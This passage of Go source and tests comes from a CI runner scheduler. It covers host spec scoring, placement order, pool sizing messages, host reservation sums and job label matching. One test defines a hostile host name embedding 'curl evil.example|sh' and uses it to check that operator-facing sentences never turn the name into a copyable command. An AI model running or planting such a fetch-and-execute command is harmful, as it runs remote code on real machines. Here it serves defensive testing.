		known: func(h *store.Host) bool { return h.CPUs > 0 },
	},
	{
		name:  "CPU clock",
		share: 20,
		full:  4000,
		value: func(h *store.Host) float64 { return float64(h.CPUMHz) },
		known: func(h *store.Host) bool { return h.CPUMHz > 0 },
	},
	{
		name:  "memory",
		share: 25,
		full:  256 * 1024,
		value: func(h *store.Host) float64 { return float64(h.MemoryMB) },
		known: func(h *store.Host) bool { return h.MemoryMB > 0 },
	},
	{
		name:  "memory speed",
		share: 5,
		full:  6400,
		value: func(h *store.Host) float64 { return float64(h.MemoryMTs) },
		known: func(h *store.Host) bool { return h.MemoryMTs > 0 },
	},
	{
		name:  "disk",
		share: 10,
		full:  2 * 1024 * 1024,
		value: func(h *store.Host) float64 { return float64(h.DiskTotalMB) },
		known: func(h *store.Host) bool { return h.DiskTotalMB > 0 },
	},
	{
		// Storage speed is the one axis the kernel says plainly: a spinning
		// disk never reaches what a NAND device starts at. It names "ssd" or
		// "hdd" rather than a rate because no rate a probe can afford to
		// measure is one worth ranking on.
		name:  "disk speed",
		share: 10,
		full:  1,
		value: func(h *store.Host) float64 { return h.SpecDiskSpeed() },
		known: func(h *store.Host) bool { return h.DiskKind != "" },
	},
}

// HostSpecPriority rounds a host's specs to the 0..100 priority the
// placement prefers hosts by. An axis the host cannot measure -- an agent
// too old to report its CPU clock, a device that will not answer for its
// disk -- is left out and the score is taken over the axes it can, so
// unmeasured never reads as slowest; a host that reports nothing at all
// scores 0 and is placed by headroom as it always was.
func HostSpecPriority(h *store.Host) int {
	if h == nil {
		return 0
	}
	value, weight := 0.0, 0.0
	for _, axis := range hostPriorityAxes {
		if !axis.known(h) {
			continue
		}
		weight += float64(axis.share)
		value += float64(axis.share) * math.Min(axis.value(h)/axis.full, 1)
	}
	if weight == 0 {
		return 0
	}
	return int(math.Round(value / weight * 100))
}

type prioritySource string

const (
	// PrioritySourceComputed is the spec score, on every host with an agent
	// that reports any figure.
	PrioritySourceComputed prioritySource = "computed"
	// PrioritySourceOverride is the operator's own pin, standing in for the
	// spec score.
	PrioritySourceOverride prioritySource = "overridden"
)

// Priority is where a host stands in placement: the score placement prefers
// hosts by and the source that set it.
type Priority struct {
	// Score is the 0..100 figure placement compares.
	Score int
	// Source is "computed" while the spec score stands, "overridden" once an
	// operator has pinned the host's own.
	Source prioritySource
}

// HostPriority is the priority placement acts on: the operator's override
// where one is set, the spec score otherwise. The scheduler, the hosts page
// and the event stream all read this through the same function, so a card
// cannot disagree with a decision made against it.
func HostPriority(h *store.Host) Priority {
	if h == nil {
		return Priority{}
	}
	if h.PriorityOverride != nil {
		return Priority{Score: *h.PriorityOverride, Source: PrioritySourceOverride}
	}
	return Priority{Score: HostSpecPriority(h), Source: PrioritySourceComputed}
}

// HostPriorityReason is the sentence the host's card shows beside its
// priority: what the number came from, spec by spec, and what an override
// replaced.
func HostPriorityReason(h *store.Host) string {
	if h == nil {
		return ""
	}
	var parts []string
	if h.CPUs > 0 {
		parts = append(parts, fmt.Sprintf("%d CPUs", h.CPUs))
	}
	if h.CPUMHz > 0 {
		parts = append(parts, fmt.Sprintf("%.1f GHz of clock", float64(h.CPUMHz)/1000.0))
	}
	if h.MemoryMB > 0 {
		parts = append(parts, fmt.Sprintf("%.0f GB of memory", float64(h.MemoryMB)/1024.0))
	}
	if h.MemoryMTs > 0 {
		parts = append(parts, fmt.Sprintf("%d MT/s of memory speed", h.MemoryMTs))
	}
	if h.DiskTotalMB > 0 {
		parts = append(parts, fmt.Sprintf("%.0f GB of disk", float64(h.DiskTotalMB)/1024.0))
	}
	if h.DiskKind != "" {
		parts = append(parts, fmt.Sprintf("a %s work directory", h.DiskKind))
	}
	var out string
	if len(parts) == 0 {
		out = "scored from the specs this host has reported, none of which include a size yet"
	} else {
		out = fmt.Sprintf("scored from %s", strings.Join(parts, ", "))
	}
	if h.PriorityOverride != nil {
		return fmt.Sprintf("%s, ahead of the %d that would stand without it", out, HostSpecPriority(h))
	}
	return out
}

package scheduler

import (
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// The spec score is what turns "more CPU and faster CPU, more memory and
// faster memory, and more disk and faster disk" into one number a host card
// can show and the placement compares.

func TestAHostReportingNoSpecsScoresZeroAndIsPlacedAsItAlwaysWas(t *testing.T) {
	h := testHost("quiet", 4, 0)
	if got := HostSpecPriority(h); got != 0 {
		t.Errorf("HostSpecPriority = %d, want 0 for a host that reports no specs", got)
	}
	if p := HostPriority(h); p.Source != PrioritySourceComputed || p.Score != 0 {
		t.Errorf("HostPriority = %+v, want the computed 0", p)
	}
}

func TestTheSpecScoreClimbsWithEveryAxisItCanMeasure(t *testing.T) {
	base := func() *store.Host {
		h := bigHost("h")
		h.CPUMHz, h.MemoryMTs, h.DiskKind = 4800, 6400, "ssd"
		return h
	}
	best := base()
	if got := HostSpecPriority(best); got < 30 || got > 90 {
		t.Fatalf("a well-specced host scored %d, want mid-band, not pinned to either end", got)
	}
	for _, tc := range []struct {
		name string
		busy func(h *store.Host)
	}{
		{"fewer CPUs loses", func(h *store.Host) { h.CPUs, h.MemoryMB = 4, 4*1024 }},
		{"a slower clock loses", func(h *store.Host) { h.CPUMHz = 640 }},
		{"less memory loses", func(h *store.Host) { h.MemoryMB = 4 * 1024 }},
		{"a slower memory loses", func(h *store.Host) { h.MemoryMTs = 480 }},
		{"less disk loses", func(h *store.Host) { h.DiskTotalMB = 100 * 1024 }},
		{"a slower disk loses", func(h *store.Host) { h.DiskKind = "hdd" }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			other := tc.busy == nil
			_ = other
			lesser := base()
			tc.busy(lesser)
			if got := HostSpecPriority(lesser); got >= HostSpecPriority(best) {
				t.Errorf("%s scored %d, not below the full host's %d",
					tc.name, HostSpecPriority(lesser), HostSpecPriority(best))
			}
		})
	}
	// Every figure at or past its full mark is exactly 100, so the scale is
	// absolute and two fleets' numbers can be compared.
	full := base()
	full.CPUs = 64
	full.MemoryMB = 256 * 1024
	full.DiskTotalMB = 2 * 1024 * 1024
	if got := HostSpecPriority(full); got != 100 {
		t.Errorf("a full-mark host scored %d, want 100", got)
	}
}

func TestAnUnmeasuredAxisIsLeftOutRatherThanScoredLowest(t *testing.T) {
	// A host that says nothing about its clock is not a slow host: the score
	// is taken over the axis it does measure, so an eight-core host scores
	// only on the CPUs it states. Read as a zero instead, the clock would
	// have pulled the same host down to 8, and an agent too old to measure
	// one figure must not rank behind agents that can.
	h := &store.Host{ID: "h", Capacity: 4, CPUs: 8}
	// Reading the shape out: the score for 8 CPUs stated alone is the CPU
	// axis's own share, rounded, and the exact number matters, so pin it.
	if got := HostSpecPriority(h); got != 13 {
		t.Errorf("HostSpecPriority = %d, want 13 (a quarter of the CPU axis)", got)
	}
	// With the clock stated a second axis joins the average: 8 CPUs and a
	// 3.2 GHz mark-high clock raise the host's own number, on its own scale.
	if got := HostSpecPriority(&store.Host{CPUs: 8, CPUMHz: 3200}); got != 40 {
		t.Errorf("with a clock stated too, the score = %d, want 40", got)
	}
}

func TestPlacementSendsRunnersToTheHigherScoringHost(t *testing.T) {
	p := profilePool("ci", 0, 0)
	for _, order := range []string{"", HostOrderHeadroom, HostOrderLargestStandard, HostOrderBestFit} {
		big, small := bigHost("a-big"), smallHost("b-small")
		hs := newHostSet([]*store.Host{big, small}, []*store.Pool{p}, nil, now)
		hs.order = order
		// The big host fills first under whichever order, because the spec
		// score ranks it ahead before the order is ever consulted. Once the
		// profile leaves it no room, the small host takes what remains.
		got := hs.place(p, 8)
		if len(got) == 0 || got[0] != "a-big" {
			t.Errorf("order %q placed %v, want the big host first", order, got)
		}
		for i := 1; i < len(got); i++ {
			if got[i] == "a-big" && got[i-1] == "b-small" {
				t.Errorf("order %q placed %v: the big host was offered work after the small one had already been filled", order, got)
			}
		}
	}
}

func TestAnOverridePinsAHostAheadOfTheSpecScore(t *testing.T) {
	p := profilePool("ci", 0, 0)
	big, small := bigHost("a-big"), smallHost("b-small")
	pin := 100
	small.PriorityOverride = &pin
	if p := HostPriority(small); p.Source != PrioritySourceOverride || p.Score != 100 {
		t.Fatalf("HostPriority = %+v, want the operator's 100", p)
	}
	hs := newHostSet([]*store.Host{big, small}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 4); len(got) == 0 || got[0] != "b-small" {
		t.Fatalf("placed %v, want the pinned small host first", got)
	}
}

// A pool that keeps warm runners only starts them where the fleet keeps its
// work: the minimum is not different machinery, it is fewer runners, and the
// same spec score ranks which hosts they stand up on.
func TestWarmRunnerMinimumFollowsTheSpecScore(t *testing.T) {
	p := profilePool("ci", 0, 0)
	p.MinRunners = 4
	big, small := bigHost("a-big"), smallHost("b-small")
	s := snap([]*store.Pool{p}, nil, nil, []*store.Host{big, small})
	pp := only(t, Decide(s))
	creates := actionsOf(pp.Actions, ActionCreate)
	// The big machine holds three standard runners, so three of the four warm
	// ones stack there; the fourth is the small host's, which keeps its place
	// until the fleet has filled where it ranks higher.
	if len(creates) != 4 {
		t.Fatalf("creates = %d (%s), want the pool minimum of 4", len(creates), pp.Reason)
	}
	for i, c := range creates {
		want := "a-big"
		if i == 3 {
			want = "b-small"
		}
		if c.HostID != want {
			t.Fatalf("warm create %d went to %q, want %q", i+1, c.HostID, want)
		}
	}
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// A host that runs a pool smaller than a larger one would is said once, as
// information, and only then: a host that gives the pool its full size, one
// that cannot run it at all and a pool that set no minimum to shrink to all
// say nothing, because a note on every host is a note nobody reads.
func TestAHostSaysItRunsAPoolSmallerOnlyWhenItDoes(t *testing.T) {
	big := sized("big", 2, 16, hostFor(32*1024), 100000)
	thinCPU := sized("thin-cpu", 2, 3, hostFor(32*1024), 100000)
	small := sized("small", 1, 4, hostFor(2867), 100000)

	dind := func(p *store.Pool) *store.Pool { p.DockerMode = store.DockerDinD; return p }
	fixed := func(cpus, minCPUs float64) *store.Pool {
		p := limited("fixed", cpus, 1024)
		p.Resources.MinCPUs = minCPUs
		return p
	}

	cases := []struct {
		name string
		host *store.Host
		pool *store.Pool
		want []string // empty: no sentence
	}{
		{"no host", nil, automatic("auto", 0, 1024), nil},
		{"no pool", big, nil, nil},
		{"a host that cannot run it", small, dind(automatic("plain", 0, 0)), nil},
		{"an automatic pool at its full share", big, dind(automatic("auto", 0.5, 1024)), nil},
		{"an automatic pair short of CPU", thinCPU, dind(automatic("auto", 0.5, 1024)),
			[]string{"CPU, split between the runner and its Docker daemon", "above this pool's minimum"}},
		{"an automatic pair short of memory", small, dind(automatic("auto", 0, 1024)),
			[]string{"of memory, split between the runner and its Docker daemon"}},
		{"a fixed pool whose standard fits", big, fixed(4, 1), nil},
		{"a fixed pool with no minimum", thinCPU, fixed(8, 0), nil},
		{"a fixed pool cut to its minimum", thinCPU, fixed(8, 1),
			[]string{"smaller than this pool's standard size", "never less than this pool's minimum"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := HostReduction(tc.host, tc.pool)
			if len(tc.want) == 0 {
				if got != "" {
					t.Errorf("HostReduction = %q, want nothing", got)
				}
				return
			}
			for _, w := range tc.want {
				if !strings.Contains(got, w) {
					t.Errorf("HostReduction = %q, want it to contain %q", got, w)
				}
			}
		})
	}
}

// A CPU minimum the operator typed is theirs to lower, so a machine too small
// for it names it as what the runner is charged -- and, for a pair, that it is
// needed twice over. A share under the minimum alone is not a shortfall: the
// runner is given the minimum (TestAMinimumAboveTheShareIsGivenRatherThanRefused).
func TestAMinimumTheWholeMachineCannotCoverNamesIt(t *testing.T) {
	h := sized("thin-cpu", 2, 3, hostFor(32*1024), 100000)
	p := automatic("auto", 2, 0)
	p.DockerMode = store.DockerDinD
	got := HostShortfall(h, p)
	for _, w := range []string{"CPU to place on", "this pool's minimum of 2 CPU a container", "twice over for a runner and its Docker daemon"} {
		if !strings.Contains(got, w) {
			t.Errorf("shortfall = %q, want it to contain %q", got, w)
		}
	}
}

package scheduler

import (
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/naming"
	"github.com/eyupio/zoomies/internal/store"
)

// hostileName is the host name the review agent joined with. A fleet that
// enrolled such a host before the join refused it still holds it, so every
// sentence the scheduler writes about a host has to be safe for it.
const hostileName = "a`curl evil.example|sh`b"

// codeSpan is what the UI draws as a command with a copy button: the text
// between a pair of backticks on one line, as RemedyText.svelte reads it.
var codeSpan = regexp.MustCompile("`([^`\n]+)`")

// proseOnly fails the test when a sentence lets the hostile name open a code
// span or carries it as stored, and when it has lost the name altogether -- a
// reason that no longer says which host it is about is safe and useless.
func proseOnly(t *testing.T, where, text string) {
	t.Helper()
	for _, m := range codeSpan.FindAllStringSubmatch(text, -1) {
		if strings.Contains(m[1], "evil.example") {
			t.Errorf("%s: the host's name opens a code span (%q): %s", where, m[1], text)
		}
	}
	if strings.Contains(text, hostileName) {
		t.Errorf("%s: carries the host's name as stored: %s", where, text)
	}
	if !strings.Contains(text, naming.ForSentence(hostileName)) {
		t.Errorf("%s: no longer names the host: %s", where, text)
	}
}

// The reason a pool's runner is blocked is shown to the operator as the pool's
// problem, and it quotes the agent's own explanation after the host's name.
func TestTheReasonAPoolIsBlockedNamesAHostAsProse(t *testing.T) {
	host := testHost("host_a", 8, 0)
	host.Name = hostileName
	host.Backends = store.StringSlice{"process"}
	host.BackendInfo = store.HostBackends{{
		Kind:   store.BackendDocker,
		Detail: "/var/run/docker.sock is not readable by this agent",
	}}

	s := snap([]*store.Pool{testPool("linux-x64", "linux")}, nil,
		[]*store.Job{queued("j1", time.Minute, "linux")}, []*store.Host{host})
	pp := only(t, Decide(s))

	proseOnly(t, "the blocked reason", pp.Blocked)
}

// The sentence for a runner held back because the host is too small for the
// jobs waiting names each host it held off.
func TestTheReasonAHostIsHeldOffForTheJobsWaitingNamesItAsProse(t *testing.T) {
	s, _ := historyFleet(t, HistoryOn, 8400)
	s.Hosts[0].Name = hostileName
	s.Hosts[1].Name = hostileName + "-2"

	pp := only(t, Decide(s))
	proseOnly(t, "the held-off reason", pp.Blocked)
}

// Automatic pools say who joined, who left and which host was left out, in the
// audit log and as findings an operator is asked to act on.
func TestAutomaticPoolSentencesNameAHostAsProse(t *testing.T) {
	t.Run("a host left out for a size tag that is not a class", func(t *testing.T) {
		odd := autoHost("odd", 4, 16384, store.SizeSmall, labelled("size", "huge"))
		odd.Name = hostileName
		plan := PlanAutoPools(autoInput([]*store.Host{odd}))
		if len(plan.Findings) != 1 {
			t.Fatalf("findings = %+v, want the one host left out", plan.Findings)
		}
		f := plan.Findings[0]
		proseOnly(t, "the finding's message", f.Message)
		proseOnly(t, "the finding's fix", f.Fix)
		// The subject is how the finding is told apart from another, not text
		// anyone reads in a sentence, so it stays the name the host has.
		if f.Subject != hostileName {
			t.Errorf("subject = %q, want the stored name, which identifies the host", f.Subject)
		}
	})

	t.Run("the host that makes a pool", func(t *testing.T) {
		host := autoHost("tagged", 4, 16384, store.SizeSmall)
		host.Name = hostileName
		plan := PlanAutoPools(autoInput([]*store.Host{host}))
		if len(plan.Changes) != 1 {
			t.Fatalf("changes = %+v, want the one pool made", plan.Changes)
		}
		proseOnly(t, "the cause", plan.Changes[0].Cause)
		if got := plan.Changes[0].Hosts; len(got) != 1 || got[0] != hostileName {
			t.Errorf("hosts = %v, want the stored name, which is what the next pass compares against", got)
		}
	})
}

package scheduler

import (
	"fmt"
	"math/rand"
	"reflect"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// newHostSet seeds every host with what its live runners have promised away. It
// used to look through every pool and every runner for the ones on each host,
// three times over, which is hosts times runners and was 73% of Decide on a quiet
// fleet of a hundred pools; it now adds the runners up by host in one pass. The
// functions below are the ones it replaced, kept as they were, and the tests hold
// the new ones to the same answer over a great many random fleets.

// newHostSet seeds each host with its allocatable resources less what the
// runners already on it have been promised.
//
// Only live runners count, exactly as the slot count does: the snapshot keeps
// failed rows so the Runners page can show them, and charging a host for a
// runner that is gone would shrink the fleet every time one failed.
//
// Disk is the exception, and deliberately: free disk is a measurement of the
// filesystem as it is now, so what the runners already there have written is
// in the number already. Subtracting their reservations too would charge the
// same bytes twice. It is charged only for the runners this pass adds, which
// have written nothing yet.
func referenceNewHostSet(hosts []*store.Host, pools []*store.Pool, runners map[string][]*store.Runner, now time.Time) *hostSet {
	hs := &hostSet{
		hosts:          sortedHosts(hosts),
		free:           make(map[string]int, len(hosts)),
		observedCPU:    make(map[string]float64, len(hosts)),
		warming:        make(map[string]int, len(hosts)),
		warmingDinD:    make(map[string]int, len(hosts)),
		left:           make(map[string]Reservation, len(hosts)),
		alloc:          make(map[string]store.HostAllocation, len(hosts)),
		promisedMemory: make(map[string]int64, len(hosts)),
		ours:           make(map[string]bool, len(hosts)),
		now:            now,
	}
	for _, h := range hs.hosts {
		hs.free[h.ID] = h.Free()
		a := h.Allocatable()
		hs.alloc[h.ID] = a
		hs.left[h.ID] = Reservation{CPUs: a.CPUs, MemoryMB: a.MemoryMB, DiskMB: a.DiskMB}
	}
	for _, h := range hs.hosts {
		// One sum, shared with the host view: what the page shows a host has
		// promised away and what a pass starts from must be the same number,
		// or an operator reads one figure and the scheduler acts on another.
		res := referenceReserved(h, pools, runners)
		l := hs.left[h.ID]
		l.CPUs -= res.CPUs
		l.MemoryMB -= res.MemoryMB
		if hs.alloc[h.ID].DiskKnown {
			l.DiskMB -= res.DiskMB
		}
		hs.promisedMemory[h.ID] = l.MemoryMB
		hs.ours[h.ID] = referenceHostRunsOurs(h, runners)
		pending := hs.referencePending(h, pools, runners)
		if h.Usage.Fresh(now) {
			if v := h.Usage.MemoryAvailableMB; v != nil {
				// The host sample already includes running work, and what the
				// operating system itself is using is the reserve's whole
				// job, so the reserve is not taken off here. It is already
				// inside Allocatable, which is what a slot's size is measured
				// against; charging it a second time here makes measured
				// headroom permanently one reserve tighter than the figure a
				// pool asks for, and a host cut into a single slot then wants
				// its whole allocatable memory and can never have that much
				// left. That host reported "short of memory" at every pass,
				// at any size of machine, and its slot was never filled.
				// Subtract only starts whose demand the sample cannot yet
				// contain, then take the tighter of measured headroom and
				// reservation headroom.
				available := *v - pending.MemoryMB
				l.MemoryMB = min(l.MemoryMB, max(available, 0))
			}
			// CPU runners are using because it was lent them is not
			// taken: the next elastic plan gives it back to a start.
			if v := h.Usage.UnlentCPUPercent(); v != nil {
				hs.observedCPU[h.ID] = max(float64(h.CPUs)*(1-*v/100)-h.CPUReserve()-pending.CPUs, 0)
			}
		}
		hs.left[h.ID] = l
	}
	return hs
}

// Reserved is what the live runners already on h have promised away.
func referenceReserved(h *store.Host, pools []*store.Pool, runners map[string][]*store.Runner) Reservation {
	var out Reservation
	if h == nil {
		return out
	}
	for _, p := range pools {
		if p == nil {
			continue
		}
		for _, r := range runners[p.ID] {
			if r == nil || r.HostID != h.ID || !r.State.Live() {
				continue
			}
			res := RunnerCharge(p, h, r)
			out.CPUs += res.CPUs
			out.MemoryMB += res.MemoryMB
			out.DiskMB += res.DiskMB
		}
	}
	return out
}

// hostRunsOurs reports whether any live runner of ours is on h, in any pool.
func referenceHostRunsOurs(h *store.Host, runners map[string][]*store.Runner) bool {
	for _, rs := range runners {
		for _, r := range rs {
			if r != nil && r.HostID == h.ID && r.State.Live() {
				return true
			}
		}
	}
	return false
}

func (hs *hostSet) referencePending(h *store.Host, pools []*store.Pool, runners map[string][]*store.Runner) Reservation {
	var out Reservation
	for _, p := range pools {
		if p == nil {
			continue
		}
		for _, r := range runners[p.ID] {
			if r == nil || r.HostID != h.ID || !r.State.Live() {
				continue
			}
			starting := r.State == store.RunnerProvisioning || r.State == store.RunnerRegistering
			if starting {
				hs.warming[h.ID]++
				if p.DockerMode == store.DockerDinD {
					hs.warmingDinD[h.ID]++
				}
			}
			if starting || r.CreatedAt.After(h.Usage.SampledAt) ||
				(r.ContainerStartedAt != nil && r.ContainerStartedAt.After(h.Usage.SampledAt)) {
				res := RunnerCharge(p, h, r)
				out.CPUs += res.CPUs
				out.MemoryMB += res.MemoryMB
			}
		}
	}
	return out
}

// randomHostFleet is a fleet with everything the sums look at: hosts that have
// and have not been sampled, pools with typed and shared sizes, docker-in-docker,
// runners in every state on hosts that exist, hosts that do not and no host at
// all, some reduced, some lent memory, some started after the host's last sample,
// pools the snapshot does not list and rows that are nil.
func randomHostFleet(rng *rand.Rand) ([]*store.Host, []*store.Pool, map[string][]*store.Runner) {
	var hosts []*store.Host
	for i := range 1 + rng.Intn(8) {
		h := sized(fmt.Sprintf("host_%02d", i), 1+rng.Intn(8), 2+rng.Intn(30), int64(2048*(1+rng.Intn(30))), 100_000)
		switch rng.Intn(3) {
		case 1: // a sample taken a little while ago
			h.Usage = store.HostUsage{SampledAt: now.Add(-time.Duration(rng.Intn(60)) * time.Second),
				MemoryAvailableMB: ptr(int64(rng.Intn(60_000))), CPUPercent: ptr(float64(rng.Intn(100)))}
		case 2: // a sample too old to count
			h.Usage = store.HostUsage{SampledAt: now.Add(-10 * time.Minute), MemoryAvailableMB: ptr(int64(1000))}
		}
		hosts = append(hosts, h)
	}
	if rng.Intn(6) == 0 {
		// A fleet does not list a host twice, and if one did, each listing is
		// asked about as though the other were not there.
		hosts = append(hosts, hosts[rng.Intn(len(hosts))])
	}

	var pools []*store.Pool
	runners := map[string][]*store.Runner{}
	states := []store.RunnerState{store.RunnerProvisioning, store.RunnerRegistering, store.RunnerIdle, store.RunnerBusy,
		store.RunnerDraining, store.RunnerRemoved, store.RunnerFailed}
	hostIDs := []string{"", "host_unknown"}
	for _, h := range hosts {
		hostIDs = append(hostIDs, h.ID, h.ID, h.ID)
	}
	for i := range 1 + rng.Intn(10) {
		p := testPool(fmt.Sprintf("pool%02d", i), "self-hosted", fmt.Sprintf("pool%02d", i))
		p.ID = "pool_" + p.Name
		switch rng.Intn(4) {
		case 1:
			p.Resources = store.Resources{CPUs: float64(1 + rng.Intn(4)), MemoryMB: int64(512 * (1 + rng.Intn(8)))}
		case 2:
			p.DockerMode = store.DockerDinD
		case 3:
			p.Resources = store.Resources{CPUs: 2, MemoryMB: 4096, MinCPUs: 1, MinMemoryMB: 2048}
		}
		pools = append(pools, p)
	}
	phantom := &store.Pool{ID: "pool_not_listed", Name: "not-listed"}
	for _, p := range append(append([]*store.Pool{}, pools...), phantom) {
		for k := range rng.Intn(7) {
			if rng.Intn(15) == 0 {
				runners[p.ID] = append(runners[p.ID], nil)
				continue
			}
			r := testRunner(fmt.Sprintf("run_%s_%d", p.Name, k), p, states[rng.Intn(len(states))], time.Duration(rng.Intn(600))*time.Second)
			r.HostID = hostIDs[rng.Intn(len(hostIDs))]
			if rng.Intn(3) == 0 {
				started := now.Add(-time.Duration(rng.Intn(120)) * time.Second)
				r.ContainerStartedAt = &started
			}
			if rng.Intn(3) == 0 {
				r.AllocatedCPUs, r.AllocatedMemoryMB = float64(1+rng.Intn(3)), int64(256*(1+rng.Intn(16)))
				r.AllocationSource = []string{"", store.AllocationReduced, store.AllocationHistory}[rng.Intn(3)]
			}
			if rng.Intn(5) == 0 {
				r.LentMemoryMB = int64(128 * (1 + rng.Intn(8)))
			}
			runners[p.ID] = append(runners[p.ID], r)
		}
	}
	if rng.Intn(4) == 0 {
		pools = append(pools, nil)
	}
	return hosts, pools, runners
}

func TestAddingTheRunnersUpByHostSeedsTheHostsAsLookingThroughAllOfThemForEachDid(t *testing.T) {
	var charged, warming, ours, pendingCharged int
	for seed := range int64(600) {
		rng := rand.New(rand.NewSource(seed))
		hosts, pools, runners := randomHostFleet(rng)

		got := newHostSet(hosts, pools, runners, now)
		want := referenceNewHostSet(hosts, pools, runners, now)
		if !reflect.DeepEqual(got, want) {
			t.Fatalf("seed %d: the host set differs\n got: %+v\nwant: %+v", seed, got, want)
		}

		// The sum the Hosts page shows is the one the pass starts from, for every host at once and for each alone.
		byHost := ReservedByHost(hosts, pools, runners)
		for _, h := range hosts {
			want := referenceReserved(h, pools, runners)
			if byHost[h.ID] != want {
				t.Fatalf("seed %d: ReservedByHost gives host %s %+v; looking through every runner for it gives %+v", seed, h.ID, byHost[h.ID], want)
			}
			if alone := Reserved(h, pools, runners); alone != want {
				t.Fatalf("seed %d: Reserved gives host %s %+v; looking through every runner for it gives %+v", seed, h.ID, alone, want)
			}
			if byHost[h.ID].MemoryMB > 0 {
				charged++
			}
			if got.warming[h.ID] > 0 {
				warming++
			}
			if got.ours[h.ID] {
				ours++
			}
			if got.promisedMemory[h.ID] != got.left[h.ID].MemoryMB {
				pendingCharged++
			}
		}
	}
	// The comparison says something only if the fleets gave it something to compare.
	if charged == 0 || warming == 0 || ours == 0 || pendingCharged == 0 {
		t.Fatalf("the random fleets exercised too little: %d hosts charged, %d warming, %d running ours, %d with pending charges", charged, warming, ours, pendingCharged)
	}
}

func TestReservedByHostLeavesOutAHostThatIsNotThere(t *testing.T) {
	h := sized("host_a", 2, 8, 16*1024, 100_000)
	p := testPool("a", "self-hosted")
	r := testRunner("run_1", p, store.RunnerIdle, time.Minute)
	r.HostID = h.ID
	runners := map[string][]*store.Runner{p.ID: {r}}
	got := ReservedByHost([]*store.Host{nil, h}, []*store.Pool{p}, runners)
	if want := referenceReserved(h, []*store.Pool{p}, runners); len(got) != 1 || got[h.ID] != want || want.MemoryMB == 0 {
		t.Errorf("ReservedByHost = %+v; want only host_a, with the %+v its runner has promised", got, want)
	}
}

package scheduler

import (
	"fmt"
	"slices"

	"github.com/eyupio/zoomies/internal/store"
)

// osLabels and archLabels split store.ImplicitLabels into the two dimensions a
// pool can genuinely contradict. "self-hosted" belongs to neither: every pool
// in Zoomies is self-hosted, so a job asking for it constrains nothing.
var (
	osLabels   = map[string]bool{"linux": true, "windows": true, "macos": true}
	archLabels = map[string]bool{"x64": true, "arm": true, "arm64": true}
)

const (
	// noMatch is the score of a pool that cannot run a job at all. It is
	// negative so that callers can sort scores and reject anything below zero.
	noMatch = -1
	// exactScore is what a pool scores when it advertises precisely the labels
	// the job asked for. Surplus labels count down from here, which keeps every
	// matching score non-negative for any sane label set.
	exactScore = 1 << 16
)

// Matches reports whether a pool advertising poolLabels may run a job whose
// runs-on listed jobLabels.
//
// The rule mirrors what GitHub itself does. Labels every actions/runner binary
// advertises (store.ImplicitLabels) do not constrain pool selection, because
// "runs-on: [self-hosted, linux, x64]" is how nearly every workflow is written
// and it is not a request for a particular pool. The one exception is a pool
// that declares its own os or arch: that is a promise about the machine, so a
// job asking for a different one must not land there.
func Matches(poolLabels, jobLabels []string) bool {
	return matches(store.NormalizeLabels(poolLabels), labelsOf(store.NormalizeLabels(jobLabels)), true)
}

// PoolMatches is Matches for a whole pool, which knows whether its runners
// advertise the implicit labels at all. A pool registered with
// --no-default-labels carries exactly the labels it lists, so a job asking
// for self-hosted or linux must find those among them: GitHub would never
// offer that job to such a runner, and a runner started for it would sit
// idle while the job waited.
func PoolMatches(p *store.Pool, jobLabels []string) bool {
	return matches(store.NormalizeLabels(p.Labels), labelsOf(store.NormalizeLabels(jobLabels)), !p.NoDefaultLabels)
}

// jobLabels is a job's normalised labels with the one question every
// comparison would otherwise put to a map for itself, answered once: which of
// them are the labels every runner advertises. A pass sets each queued job
// against every pool, and the pools that cannot run it turn it away on its first
// label, so that lookup was the commonest thing the matching did.
type jobLabels struct {
	names []string
	// implicit has bit i set when names[i] is in store.ImplicitLabels, for the
	// first 64 labels. A job has a handful, so the word is enough; the rest ask
	// the map, which is slower and still right.
	implicit uint64
}

// labelsOf classifies a job's labels, which the caller has put through
// NormalizeLabels.
func labelsOf(names []string) jobLabels {
	j := jobLabels{names: names}
	for i, l := range names[:min(len(names), 64)] {
		if store.ImplicitLabels[l] {
			j.implicit |= 1 << i
		}
	}
	return j
}

// isImplicit reports whether the job's i-th label is one every runner advertises.
func (j jobLabels) isImplicit(i int) bool {
	if i < 64 {
		return j.implicit&(1<<i) != 0
	}
	return store.ImplicitLabels[j.names[i]]
}

// matches is Matches over a pool's normalised labels and a job's classified
// ones. implicit says whether the pool's runners advertise store.ImplicitLabels.
func matches(pool []string, job jobLabels, implicit bool) bool {
	for i, l := range job.names {
		if implicit && job.isImplicit(i) {
			continue
		}
		if !slices.Contains(pool, l) {
			return false
		}
	}
	return !contradicts(pool, job.names, osLabels) && !contradicts(pool, job.names, archLabels)
}

// contradicts reports whether the job asked for a label from dim that the pool
// lacks while declaring a different label from the same dimension. A pool that
// declares nothing in a dimension makes no promise and contradicts nothing.
func contradicts(pool, job []string, dim map[string]bool) bool {
	declares := slices.ContainsFunc(pool, func(l string) bool { return dim[l] })
	if !declares {
		return false
	}
	return slices.ContainsFunc(job, func(l string) bool {
		return dim[l] && !slices.Contains(pool, l)
	})
}

// Score ranks how well a pool fits a job. Higher is better; a negative score
// means the pool cannot run the job at all.
//
// Every matching pool satisfies all of the job's explicit labels by
// construction, so the only thing left to rank on is surplus: capability the
// job never asked for. Preferring the smallest surplus keeps a specialised
// pool (say gpu + cuda12) free for the jobs that actually need it.
func Score(poolLabels, jobLabels []string) int {
	return score(poolLabels, jobLabels, true)
}

// score is Score for a pool that may not advertise the implicit labels.
func score(poolLabels, jobLabels []string, implicit bool) int {
	pool := store.NormalizeLabels(poolLabels)
	job := labelsOf(store.NormalizeLabels(jobLabels))
	if !matches(pool, job, implicit) {
		return noMatch
	}
	return surplusScore(pool, job.names)
}

// surplusScore is the score of a pool already known to match a job, both
// normalised: how little of what the pool advertises the job never asked for.
func surplusScore(pool, job []string) int {
	surplus := 0
	for _, l := range pool {
		if !slices.Contains(job, l) {
			surplus++
		}
	}
	return max(exactScore-surplus, 0)
}

// Eligible reports whether a pool may run a job at all, and when it may not,
// says why in the operator's words.
//
// The three tests are asked in the order an operator would ask them. A
// disabled pool was disabled on purpose. A pool belonging to another GitHub
